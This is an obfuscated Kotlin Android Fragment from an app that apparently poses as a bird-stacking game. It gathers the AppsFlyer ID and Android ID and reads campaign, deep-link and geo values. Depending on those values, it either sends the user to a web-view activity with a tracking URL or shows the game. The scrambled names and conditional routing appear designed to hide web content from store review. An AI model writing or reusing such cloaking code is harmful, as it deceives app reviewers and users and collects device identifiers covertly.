package com.kooapps.stackybirdand.flxzo
import org.koin.android.ext.android.inject
import com.appsflyer.AppsFlyerLib
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.zpapsowkkosd
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.hncnkxvijd
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.dplpl
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.apalslpaslpplxkozcok
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.gobiiuhvoko
import org.koin.core.qualifier.named
import androidx.fragment.app.Fragment
import android.content.Context
import android.view.ViewGroup
import android.content.Intent
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.dpelplw
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.epppqppwppssoxkzkocxokji
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.spwllps
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.dpllpxzplcpl
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.spaplplplxplzc
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.xppocox
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.eplwlplpslpd
import android.view.LayoutInflater
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.view.View
import com.kooapps.stackybirdand.R
import com.kooapps.stackybirdand.asaw.Nofokkocjix

import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.rpltlplp
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.bhibijv
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.sokdko
import com.kooapps.stackybirdand.tsrwiuq.Hiwiwosixjzc.cxokvkcxkokocxkojid

import com.kooapps.stackybirdand.tsrwiuq.Ksytxuzchuzxhu


class Trooewsad : Fragment() {
    private lateinit var xzokckoijjisjias: Context
    val eplwlpw: SharedPreferences by inject(named("SharedPreferences"))

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.gokkockoi, container, false)
    }



    override fun onAttach(context: Context) {
        super.onAttach(context)
        xzokckoijjisjias = context
    }

    override fun onStart() {
        super.onStart()
        val cnxvjcxidkokofddkof = eplwlpw.getString(sokdko, null)
        val ckkcxmvmkcmkmkcjivd = Intent(activity, Ksytxuzchuzxhu::class.java)
        val repwlp = eplwlpw.getString("deepSt", null)
        val dokkoweokw = eplwlpw.getString(spwllps, null)

        val dskofkosdpel = eplwlpw.getString("appCamp", null)
        val fkoxcokvko = eplwlpw.getString(epppqppwppssoxkzkocxokji, null)
        val zixjcjikosakokoskodoak = AppsFlyerLib.getInstance().getAppsFlyerUID(xzokckoijjisjias)
        val fokokcx = Build.VERSION.RELEASE

        val wplqplplwpllpslpd = eplwlpw.getString(xppocox, null)
        val fkoocxokv: String? = eplwlpw.getString(apalslpaslpplxkozcok, null)
        eplwlpw.edit().putString(dpllpxzplcpl, zixjcjikosakokoskodoak).apply()
        val epwplwlpq = Intent(activity, Nofokkocjix::class.java)
        val aplpslplpxzkockoxz = eplwlpw.getString("mainId", null)
        val tokrokdko = "com.kooapps.stackybirdand"

        val soakodwko = eplwlpw.getString(spaplplplxplzc, null)



        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        val apllpsalp = "$soakodwko$cxokvkcxkokocxkojid$dskofkosdpel&$eplwlplpslpd$zixjcjikosakokoskodoak&$hncnkxvijd$aplpslplpxzkockoxz&$zpapsowkkosd$tokrokdko&$rpltlplp$fokokcx&$dplpl$bhibijv"
        val ijzxjicjizxkokozxok = "$soakodwko$eplwlplpslpd$dokkoweokw&$hncnkxvijd$fkoocxokv&$zpapsowkkosd$tokrokdko&$rpltlplp$fokokcx&$dplpl$bhibijv"
        val fokkocoxvk = "$soakodwko$cxokvkcxkokocxkojid$repwlp&$eplwlplpslpd$zixjcjikosakokoskodoak&$hncnkxvijd$aplpslplpxzkockoxz&$zpapsowkkosd$tokrokdko&$rpltlplp$fokokcx&$dplpl$dpelplw"
        val rokekoowk = "$soakodwko$cxokvkcxkokocxkojid$repwlp&$eplwlplpslpd$dokkoweokw&$hncnkxvijd$fkoocxokv&$zpapsowkkosd$tokrokdko&$rpltlplp$fokokcx&$dplpl$dpelplw"

        when(fkoxcokvko) {
            "1" ->
                if(dskofkosdpel!= "null") {
                    eplwlpw.edit().putString(gobiiuhvoko, apllpsalp).apply()
                    eplwlpw.edit().putString("WebInt", "campaign").apply()
                    startActivity(epwplwlpq)
                    activity?.finish()
                } else if (repwlp!=null||wplqplplwpllpslpd!!.contains(cnxvjcxidkokofddkof.toString())) {
                    eplwlpw.edit().putString(gobiiuhvoko, fokkocoxvk).apply()
                    eplwlpw.edit().putString("WebInt", "deepLink").apply()
                    startActivity(epwplwlpq)
                    activity?.finish()
                } else {
                    startActivity(ckkcxmvmkcmkmkcjivd)
                    activity?.finish()
                }
            "0" ->
                if(repwlp!=null) {
                    eplwlpw.edit().putString(gobiiuhvoko, rokekoowk).apply()
                    eplwlpw.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(epwplwlpq)
                    activity?.finish()
                } else if (wplqplplwpllpslpd!!.contains(cnxvjcxidkokofddkof.toString())) {
                    eplwlpw.edit().putString(gobiiuhvoko, ijzxjicjizxkokozxok).apply()
                    eplwlpw.edit().putString("WebInt", "geo").apply()
                    startActivity(epwplwlpq)
                    activity?.finish()
                } else {
                    startActivity(ckkcxmvmkcmkmkcjivd)
                    activity?.finish()
                }
        }
    }










}
